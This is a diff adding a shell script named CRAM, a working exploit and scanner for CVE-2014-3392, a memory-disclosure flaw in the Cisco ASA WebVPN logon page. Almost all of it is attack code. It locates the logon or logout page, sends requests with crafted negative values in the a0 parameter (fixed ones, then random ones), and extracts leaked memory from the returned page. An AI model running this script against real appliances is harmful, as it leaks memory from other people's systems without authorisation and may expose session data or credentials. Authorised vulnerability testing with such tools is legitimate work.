@@ -1,0 +1,150 @@
+#!/usr/bin/env sh
+#
+# CRAM
+# Cisco Randomly Accessed Memory
+# This script is associated with CVE-2014-3392
+# http://www.securityfocus.com/bid/70306
+# http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa
+#
+
+### Make sure we can get to the logon page ###
+testLogon () {
+	logon="https://$target/+CSCOE+/logon.html?"
+	### The logout page appears to make it so we do not need to worry about WebLaunch ###
+	logout="https://$target/+CSCOE+/logout.html?reason=12"
+	lpOpen=$(curl -k -I -s $logon|grep -o "webvpnlogin=1")
+
+	if test ! "$lpOpen"
+	then
+		lpOpen=$(curl -k -s $logout|grep -o "username_field")
+		if test ! "$lpOpen"
+		then
+			printf "It was not possible to access the logon/logout page\n"
+			exit 99
+		else
+			page=$logout
+		fi
+	else
+		page=$logon
+	fi
+	testVuln
+}
+
+### Lets test the vuln ###
+testVuln () {
+	printf "\nPage to be targeted: $page\n\n"
+
+	### All data within the Auth_Message is also found at the bottom of the page in the following tag ###
+	targetText='/<div style="margin:10px">/,/<\/div>/'
+	i=1
+	fcnt=0
+
+	### Numbers known to generally cause output ###
+	printf "The following requests have been known to generate output:\n"
+	defaultNums="88,102,202,22222,99999"
+	set -f; IFS=','
+
+	for value in $defaultNums
+	do
+		num=$value
+
+		request
+
+		response
+	done
+
+	set +f; unset IFS
+
+	### If we are getting too many errors the application is probably not vulnerable ###
+	if test $fcnt -gt 4
+	then
+		printf "\nThe target does not appear to be vulnerable\n"
+		exit 666
+	fi
+
+	## Exit if no additional rounds are requested ##
+	if test $rounds == "0"
+	then
+		printf "\nNo additional requests were performed.\n\n"
+		exit 2
+	fi
+
+	### Random numbers ###
+	printf "\nThe following requests will use random numbers:\n"
+	for i in $(seq 1 $rounds)
+	do
+		num=$(echo "$(od -An -N3 -tu4 /dev/urandom) % 200000 + 1" | bc)
+
+		request
+
+		response
+
+	done
+
+	printf "\n$rounds random numbers were tested against $target\n\n"
+}
+
+request () {
+	req=$(curl -k -s "$page&a0=-$num"|awk "$targetText")
+}
+
+response () {
+	if test "$req"
+	then
+		success
+	else
+		fail
+	fi
+}
+
+success () {
+	printf "Success: "
+	printf "%d\n" -$num
+
+	if test $verbose
+	then
+		printf "\n%s\n\n**********\n\n" "$req"
+	fi
+}
+
+fail () {
+	printf "Fail (%d)\n" -$num
+	fcnt=$(echo $fcnt+1|bc)
+}
+
+help () {
+	usage="$(basename $0) [-h] [-t] [-v] [-r]\n
+  -h    Show this help text
+  -t    Target (Required)
+  -v    Verbose
+  -r    Number of Random number requests\n\n"
+	printf "$usage"
+	exit 1
+}
+
+
+### Setup initial variables ###
+verbose=
+target=
+rounds=10
+while [ $# -gt 0 ]
+do
+	case "$1" in
+	-v)	verbose=on;;
+	-t)	target=$2;;
+	-r)	rounds=$2;;
+	-h)	help;;
+	esac
+	shift
+done
+
+### If we do not have a target we need to quit ###
+if test ! $target
+then
+	printf "\nNo target (-t) found\n\n"
+	exit 88
+fi
+
+### Test that we can get to the logon page ###
+testLogon $target
+
